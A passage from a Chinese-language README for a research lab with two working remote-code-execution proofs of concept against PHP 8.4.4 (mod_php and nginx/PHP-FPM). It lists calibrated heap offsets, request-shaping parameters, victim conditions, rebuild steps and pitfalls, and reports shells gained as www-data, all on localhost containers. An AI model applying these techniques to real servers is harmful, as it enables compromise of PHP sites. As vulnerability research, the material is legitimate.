| `E_OFF` | `chunk + 0x76000` | 与 8M 版实测相同,填充起于第 100 页 |
| `DT_OFF` | `chunk + 0x7C000` | 陈旧 `var_dtor_entries` 块搬到第 124 页(填充字段只有 32 页) |
| push 目标 | `0x63058` / `0x63050` / `0x58190` | 与 8M 完全一致,`aim(off) = (off - (E_OFF+16)) // 8` |
| 填充字段 | `FILLER=131072` B(32 页),起于第 `FSTART=100` 页 | 同时覆盖 `E_OFF` 和 `DT_OFF` |
| 压力分片 | `PRESS=920` 个 `filename=""`、depth `LEVELS=60` 的 RFC1867 分片 | 约 300 B/片换约 128 KB 堆,填满足以打死 worker |
| prime 压力 | `PRIME_PRESS=780`(< `PRESS`) | 解析阶段必须活着走到 `session_start()`,由 decode 撞限制 |
| prime 请求 | `FIELDS=170` × `FIELD_LEN=4000` + `DUP` 重名字段 | 填住 chunk 剩下的洞 |
| session 记录 | `SMALL=73` 条小记录 + `BIG=20` 条 `FNLEN=750000` B 文件名 | `build_A()`,落盘 15,029,535 B |
| 请求体 | 最大 1,022,503 B(A-big) | 全部 < nginx 默认 `client_max_body_size 1m` |
| ini | `memory_limit=128M`(PHP 出厂默认)、`post_max_size=8M`、upload_progress On+cleanup On | `docker/fpm128/php.ini`,nginx.conf 不调 body 上限 |
| `WORKERS` | 1(`fpm128`)/ 4(`fpm4`) | 需要 arm 的存活子进程数;`fpm4` 用 `docker/fpm4/php-fpm.conf` 的 `pm = static` + `pm.max_children = 4` |
| `ATTEMPTS` | 单 worker 1、池 3 | 整条链的重试次数,每次换一组 session id(阶段打空时记录会被清掉) |
| `SETTLE` | 0.5 s | 每轮 arm 前等子进程补满的间隔 |

PoC 需要从目标拿到的只有每次运行泄漏出的 `chunk` 与 `libphp` 基址,所以 ASLR 和容器
重启都不影响。*不可*移植的是请求形态:`R0`、填充数量、`CMDOFF` 是这个构建、这份
`php.ini` 与这个受害者页面的属性。`measure/` 保存了得到它们的 gdb 驱动
(`measure/gdb/gdb-psdump.py` 在 stage-A 之后读取陈旧的 `PS()` 全局变量,
`measure/gdb/gdb-s3trace.py` 跟踪
`track_init → reference_destroy → hash_destroy → zif_system`),
`measure/dev_r0.py` 演示如何为新布局重测 `R0`。`def_rce.py` 支持从环境变量读
`BURN_SPEC/TAILB/TAILC/TAILD/DUPNAMES/CMDOFF/R0_OFF/NFILL/FILLSZ/S3_BIGLEN`,
重测之后不需要改代码。

FPM 链的每个数同样可以用同名环境变量覆盖 —— 8M 版是
`E_OFF`/`SCALAR_PUSH`/`ARRAY_PUSH`/`LAST_DELTA`/`FILLER`/`FSTART`/`ENTPAGE`/`DTPAGE`/
`NESTED`/`PRIME_NESTED`/`LEVELS`/`SMALL`/`FNLEN`/`FILL_FIELDS`/`FILL_LEN`/`DUP`,128M
版是 `E_OFF`/`DT_OFF`/`SCALAR_PUSH`/`ARRAY_PUSH`/`WRITER`/`FILLER`/`FSTART`/`PRESS`/
`PRIME_PRESS`/`FIELDS`/`FIELD_LEN`/`LEVELS`/`SMALL`/`BIG`/`FNLEN`/`DUP`,池编排再加
`WORKERS`/`ATTEMPTS`/`SETTLE`,换构建或换 ini 之后重测即可。它
*完全不需要泄漏*:伪块、progress 结构、写入器都按 chunk 相对偏移定位,而 chunk 内部
布局在 `fork()` 之后逐字节相同,所以容器重启换一套 ASLR 也不影响(实测过)。

## 受害者条件

**mod_php 链**硬性条件:PHP 8.4.x mod_php(prefork)、`session.upload_progress.enabled=On` 且
`.cleanup=On`、`session.use_cookies=On`、`session.use_strict_mode=Off`、`files`
save handler 且 `save_path` 可写、`memory_limit` 可被填充打满。
已经不再是条件:`display_errors`(两种)、`expose_php`(两种)、
`session.save_path` 长度(两种)、`memory_limit`(128M/256M/512M/1G)、
`max_input_vars=1000` / `max_multipart_body_parts=-1`(出厂默认)、ASLR、
opcache(`opc` profile 用的是 `display_errors=On` 触发器 + `CMDOFF=0x7a118`)、
多 worker 线程池(扇出)。
真实世界的阻碍:Apache 前面的流量限制(饱和式 `display_errors=Off` 的 stage-1 A
body 很小、约 1–2 MB,但会吃掉整个 `memory_limit` 的堆;`display_errors=On` 触发器
把填充放在 body —— 128M 约 136 MB、1G 约 1.3 GB;`off1g` 的 stage-3 A 同样要流
1.3 GB 填充)、会截断 `Set-Cookie` 泄漏的头大小限制,以及同一阶段两个请求之间任何
堆活动 —— 两个请求必须打到同一个子进程,所以单 worker profile 钉住
`MaxRequestWorkers=1`,而 `mw` 则按线程池大小扇出(默认宽度 = 该 profile 的
`MaxRequestWorkers`,可用 `MWN` 或命令行结尾数字覆盖)。所有子进程都 `fork()` 自同一
父进程,共享同一份 chunk 与 `libphp` 基址,一次泄漏就够。

**FPM 链**硬性条件:PHP 8.4.x **PHP-FPM**(nginx 或 Apache 反代都行,只要 body 在
`sapi_activate()` 阶段就被解析)、页面上真的有 `session_start()`(或其它会走
`php_session_start()` 的入口)、`session.upload_progress.enabled=On` 且 `.cleanup=On`、
`files` save handler、**站点根目录对 `www-data` 可写**。这条链对 `display_errors` /
`expose_php` 没有要求,不需要代码指针,也不需要基址泄漏。
已经不再是条件:`memory_limit`(8M 与 PHP 出厂默认 128M 都打通)、前置的 body 大小上限
(128M 版每个请求都在 nginx 默认 1m 之内)、worker 池大小(`pm = static` 的 4 子进程池
用一轮 arm 打满,见「多 worker 变体」)。
真实世界的阻碍:落盘路径要 web 可达且可写;`pm.max_children` 大于 1 时
`WORKERS` 要对上**存活**子进程数,`pm = dynamic`/`ondemand` 下存活数会随流量变,
`fastcgi_keep_conn`/upstream keepalive 与真实流量都会改变连接到 worker 的映射;
`session.upload_progress.freq`/`min_freq`、前置的
`client_max_body_size`(8M 版要把它抬到 8m,128M 版不用)之类会改变 shaping 请求的数量
与形状。

## 回收

* `p2s.py prune [profile…]` 删除每个容器内的 `/tmp/sess_*` 与 `/srv/out/*`,以及宿主
  侧对应 `out-<profile>/` 里的文件。`exploit` 每次运行前都会清理,结束后再次清 session
  文件(`P2S_CLEAN=1`):残留 session 会让下一次 `s_read` 提前 OOM,残留 proof 会让失败
  看起来像成功。proof 文件本身保留作为证据。
* `p2s.py down [profile…]` 删除容器;`docker rmi p2s-php844` 删除镜像。除本实验目录
  之外不触碰任何东西。
* `exploit`/`verify` 会自动重建消失的容器(外部 `docker prune`、daemon 重启),而不是
  抛连接错误。
* stage-3 B *预期*会打死子进程:Apache 父进程会 fork 新的,而泄漏出的基址因为
  `fork()` 继承关系仍然有效。如果父进程本身死了,泄漏就作废 —— 先
  `p2s.py up <profile>` 再重试。
* FPM 链:`p2s.py prune fpm fpm128 fpm4` 清各自容器的 `/var/lib/php/sessions/sess_*` 和链自己
  写出的 `docker/<profile>/www/shell.php`(站点根目录是宿主挂载,写出来的 shell 会留在
  那儿,所以每次 `exploit fpm*` 前后都删),proof 目录 `out-fpm/`、`out-fpm128/`、
  `out-fpm4/` 一起清;`fpm-down [profile…]` 删容器,`docker rmi p2s-php844-fpm` 删镜像。
  prime 请求打死 worker 同样是预期行为,FPM 立刻 respawn,而 chunk 内布局与陈旧全局
  照旧。

## 重建受害者二进制

优先使用自带的 `docker/bin/libphp.so`:上面每个常量都是在这个文件上测出来的
(md5 `f402b493b1df82cbf34021b4aef133cb`)。新克隆不会带这 53 MB,所以可以自己编译:

```bash
python p2s.py build --from-source                  # 使用 docker/src/php-src-844.tar
python p2s.py build --from-source --src <php-src>  # 先对该 checkout 执行 git archive
```

`--from-source` 会构建 `docker/Dockerfile.builder`(ubuntu + 校准二进制真正链接的那些
`-dev` 包),把源码 tar 以 bind mount 挂进 `p2s-srcbuild` 容器并运行
`docker/build-libphp.sh`,产物先落在 `docker/staged/`:

* 若 `docker/bin/libphp.so` 不存在 → 直接安装到那里(已有时先备份成
  `libphp.so.calibrated`)。
* 若已存在 → 保留校准版;手工替换,或用 `--install` / `P2S_INSTALL=1`。
* `docker/src/php-src-844.tar` 与分支 `PHP-8.4.4` 的 `git archive HEAD` **字节完全一致**,
  所以它永远不需要提交。

之后 `python p2s.py offsets` 从运行中的容器读出*符号*偏移
(`docker/offsets.py` → `env/generated/offsets.env`),`exploit` 自动以
`ZIF_OFF`/`DTOR_OFF` 取用,重建后不需要手改 `zif_system` / `zval_ptr_dtor`。

重建不能白拿的是堆布局:`R0_OFF`、`CMDOFF` 和填充数量是这个构建 + 这份 `php.ini` +
这个受害者页面的属性,只能用 gdb 对着活着的子进程测:

```bash
python measure/dev_r0.py            # -> R0_OFF;CMDOFF/填充见上文「常量」
python p2s.py verify && python p2s.py exploit off   # 最省事的存活证明
```

2026-10-22 本树实测:`build --from-source` 产出的二进制 md5 为
`46ab96e6f85aecac36c4c4aafd5c5cd8`(**并非**字节一致 —— 构建目录与 DWARF 不同),
但 `zif_system=0x457fe0`、`zval_ptr_dtor=0x64b890` 保持不变;换上它之后 `off`、
`default`、`ub`、`opc` 四条链仍然全部拿到 `PROOF: uid=33(www-data)`,且
`R0=chunk+0x68140`、`htdata=chunk+0x83818`(即 `CMDOFF+0x700`)与标定值一致。
结论:同源码、同 configure、同包版本 ⇒ 标定可以活过重建。实验环境仍然保持校准文件,
因为其余 10 个 profile 没有对重建版重跑。

手工编译请使用下面这条 configure 命令(校准二进制就是用它构建的 ——
`strings docker/bin/libphp.so | grep './configure'` 可以还原,容器里 `php -i` 也显示
同一行):

```
'./configure' '--with-apxs2=/usr/bin/apxs2' '--with-config-file-path=/usr/local/etc/php'
  '--with-mhash' '--enable-mbstring' '--enable-mysqlnd' '--with-password-argon2' '--with-sodium'
  '--with-pdo-sqlite=/usr' '--with-sqlite3=/usr' '--with-curl' '--with-iconv' '--with-openssl'
  '--with-readline' '--with-zlib' '--enable-opcache' '--disable-cgi' '--disable-phpdbg' '--with-pic'
```

`--with-config-file-path=/usr/local/etc/php` 正是 `ensure`/`create` 把 profile 目录同时
挂到 `/srv/profile` 和那里的原因。`--with-readline` 链接 GNU readline(用
`libedit-dev` 会产出不同二进制,而 `--with-apxs2` 需要 `apache2-bin` 提供
`/usr/sbin/apache2`);多装一个 `-dev` 包(libzip、libicu……)会静默启用某个扩展并把堆
布局挪走 —— 所以 builder 镜像只装
`objdump -p docker/bin/libphp.so | grep NEEDED` 里出现的那些。

### FPM 受害者

`php-fpm` 不入库(同样是 53 MB 的问题),由 `fpm-build` 从同一份 php-src 现场编译:

```bash
python p2s.py fpm-build                    # 使用 docker/src/php-src-844.tar
python p2s.py fpm-build --src <php-src>    # 或指定 checkout / tar
```

它在同一个 builder 镜像里跑 `docker/build-phpfpm.sh`,configure 行本身就是标定的一部分:

```
./configure --disable-all --enable-fpm --enable-session \
    --disable-cgi --disable-cli --disable-phpdbg --prefix=/opt/phpfpm \
    CFLAGS='-g -O0 -fPIC'
```

`--disable-all` 决定扩展集合,`-O0` 决定请求启动期的分配序列 —— 上面「常量(FPM 链,
8M)」「常量(FPM 链,128M)」就是在这个组合上测的,换任何一个都会把 chunk 里的块地址
挪走。产物 `make install` 到 `/opt/phpfpm`,打包成 `docker/staged/phpfpm.tar`、解到
`docker/staged/phpfpm/`,由 `Dockerfile.fpm` 原样 `COPY` 进镜像。这条链不需要
`p2s.py offsets`(它不用任何符号偏移),重标定只需要 `E_OFF`/`DT_OFF` 那几个块地址。

2026-10-23 实测:这样编出来的 `php-fpm`(md5 `4b6b73a350e09fcc791c0f20a95ca7d0`,只链
libc/libm)上整条链**第一次就打通**,块偏移与标定值一致 —— 和 mod_php 那条同一个结论:
同源码、同 configure、同包版本 ⇒ 标定可以活过重建。128M 那套块地址最初是在另一份按同样
configure 行编译、md5 不同的 `php-fpm` 上量出来的,拿到 `fpm-build` 的产物上第一次运行
同样打通:块位置跟着 configure 行和 ini 走,不跟着构建目录走。

## 踩过的坑

* `docker/www/index.php` 必须与校准时的页面字节一致
  (`<?php echo "OK\n"; ?>` + 换行,**22 字节** —— 是真正的反斜杠 n,不是渲染出的换行)。
  用 `echo` 写文件会得到 21 字节的页面,启动期分配整体偏移一字节,`expose_php=On` 的
  stage3 会静默打不到 `R0`。
* 用 `apache2 -f <conf>` 时这个构建忽略 `PHPIniDir`;ini 必须放在编译进二进制的默认
  路径,因此才有 `/usr/local/etc/php` 的双重挂载。
* 镜像附带预编译 `libphp.so`,因为标定偏移只对字节一致的二进制成立;没有 53 MB 二进制
  时用 `build --from-source`(见上一节)。
* 绝不要在 stage-A 请求过程中挂带断点的 gdb:`SIGKILL` 掉 gdb 会在 `libphp.so` 里留下
  `int3` 字节(包括被内联的 `php_session_send_cookie`),之后每次运行都会被破坏。
  只读批处理探针(`-batch -p PID -x measure/gdb/gdb-psdump.py`,不设断点)是安全的。
* Git Bash 里给 `docker exec`/`docker cp` 加 `MSYS_NO_PATHCONV=1` 前缀,否则 `/usr/...`
  参数会被改写成 Windows 路径。
* 14 个容器 + 1 GB 填充非常吃虚拟机内存;如果 Docker Desktop 开始杀容器,改用
  `p2s.py up <子集>`。
* FPM 链的两个页面都是标定的一部分:`docker/fpm/www/index.php` 必须真的调用
  `session_start()`(39 字节),`plain.php` 是裸 `echo`(22 字节)、只用于 shaping 与
  存活探测;`docker/fpm128/www/` 与 `docker/fpm4/www/` 是这两份文件的逐字节副本。
* FPM 多 worker 编排里,**arm 与三个阶段之间不允许任何请求**:一次走到脚本执行的请求
  会跑 `PHP_RINIT(basic_functions)`,把刚留下的陈旧解码器清零,所以 PoC 在 arm 之后不
  再调 `wait_target()`;`disarm()` 取 `2 × WORKERS` 次 `GET /plain.php`,保证每个 worker
  至少被走过两次脚本执行、起点回到轮询的同一个位置。
* `WORKERS` 必须等于**存活**子进程数。`pm = static` 下这是确定的(`fpm4` 就是 4);
  `pm = dynamic` 下存活数随流量变,arm 少了就有阶段打空。
* 一个阶段打在未 arm 的 worker 上不是「无事发生」:那次请求会正常跑完并让
  `upload_progress.cleanup` 删掉 payload 记录,整条链得重来。所以池模式用全新的 session
  id 重试(`ATTEMPTS`),而不是在同一个 `sess_scal` 上继续。
* N 个 prime 必须**连续**发出:prime 之间夹任何请求(包括给另一个 session 灌 A 记录)都会
  让某个 worker 在 arm 之后又被 RINIT 清零。这就是 `build_A()` 全部做完才轮到 `arm()` 的原因。
* FPM 链的 shaping 请求打死 worker **是预期的**,但状态码跟着「子进程死了之前 flush 了
  多少」走:8M 目标上是 502/500,128M 目标上是 200。PoC 用 `wait_target()` 轮询到
  `/plain.php` 重新 200 才发下一步,判断成功与否看写出来的 shell 有没有回显,别看状态码。
* 128M 版的 `PRIME_PRESS=780` 必须小于 `PRESS=920`:prime 的目标是让 `session_start()`
  里的 decode 撞限制,不是让 body 解析撞限制。分片给多了,请求死在解析阶段,`BG(unserialize)`
  不会悬空,后面的 decode 步骤全部空转。
* 128M 版的 A-big 请求体 1,022,503 B,离 nginx 默认 1m(1,048,576)只剩约 26 KB:
  `FNLEN` 一定要留成可环境变量覆盖的,加大它会悄悄撞上 413。
* FPM 链要求站点根目录可写,所以 `docker/<profile>/www` 是**读写**挂载:链写出的
  `shell.php` 会留在宿主目录里,靠 `prune fpm fpm128 fpm4` / `exploit fpm*` 的前后清理回收。
* Git Bash 里 `SHELL` 已有环境含义,别拿它当 PoC 的变量名 —— FPM 的落盘路径用
  `FPM_SHELL`。

## 整理时从原目录删掉的内容

原工作目录约有 330 个文件。这里删掉了:废弃的基于 `hash_update` 的链
(`api/`、`fixed/`、`minimal/`、`reseed/`、`stale/`)、另一个 agent 的 git clone
(`ref_remote/`,44 MB)、抓下来的 Calif 报告(`calif-php2shell.html/.txt`)、被取代的
8094 三段式 `full_rce.py`,以及需要提高 `max_input_vars`/`max_multipart_body_parts`
且偏移已过期的 `off_rce.py`、一次性的 `off_a*.py` / `measure_def_ab.py` 标定驱动、
约 50 个 `gdb-*.txt` 终端记录、FPM 那条线早期的裸机探测脚本(绕过 nginx 直连 9000 端口的
`fcgi.py`、`bg_fpm.py` 和整套 `gdb-bg*.py` 探针 —— 它们的结论以常量形式写进了
`exploits/fpm_rce.py`,容器化的 HTTP 环境重写成了 `docker/Dockerfile.fpm` +
`docker/fpm/`),以及所有 `out-*` 运行产物。
保留:六个 PoC(mod_php 四个 + nginx/PHP-FPM 两个,后者按 `WORKERS` 覆盖单 worker 与
4 worker 池两种目标)加原样保留的参考实现
`exploit.py`、记录了每个常量*如何*测得的 gdb 驱动脚本,以及这些驱动加载的四个
`gdb-*.py`。

两条链都在本仓库里、各自一条命令跑通:mod_php 见「利用链(一)」(`exploit off` 等),
nginx + PHP-FPM 见「利用链(二)」(`exploit fpm` / `exploit fpm128` / `exploit fpm4`)。

## 致谢

* [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
  —— 本工作的源头。mod_php 请求可以在 session 已初始化之后因 OOM bailout,而这个
  bailout 仍能被骗出一次越界 `Set-Cookie` 泄漏;泄漏里同时带着 Zend MM chunk 基址和
  `libphp.so` 基址(这正是本链在此场景下绕过 ASLR 的关键);
  `session.upload_progress` + `PHP_SESSION_UPLOAD_PROGRESS` 是把伪
  `zend_reference` 打过去的分配点 —— 这些洞见都是他们的,包括
  `<?php echo "OK\n"; ?>` 这个最小攻击面和 A1/B1/A2/B2 的阶段结构。
  本树里的 `exploits/exploit.py` 就是他们的链,作为参考实现原样保留(只修了两个本树内
  的路径)。没有那个项目,这里的一切都不存在。
* Calif Research 的 php2shell 一文(calif.io)—— FPM 这条链的方向来自它:PHP-FPM 的
  pre-RINIT session 解码会留下悬空的 `BG(unserialize)` 解码器。把它做成纯 HTTP、可
  一键复现的 nginx + PHP-FPM 利用(三步逼近的 push 标定、任意文件写入的落点选择、
  用空文件名分片把压力放大到能吃满出厂默认 128M、按轮询把整池 worker 逐个 arm、
  容器与重建流程)是本树完成的。
* PHP 漏洞本身(session bailout 背后的 UAF)属于上游;本实验是对其可利用性的研究,
  全部只针对本实验自己创建的容器。

## 许可与使用范围

这里的一切只针对本实验在 `127.0.0.1` 创建的容器。仅用于你自己拥有或已获得授权的系统。
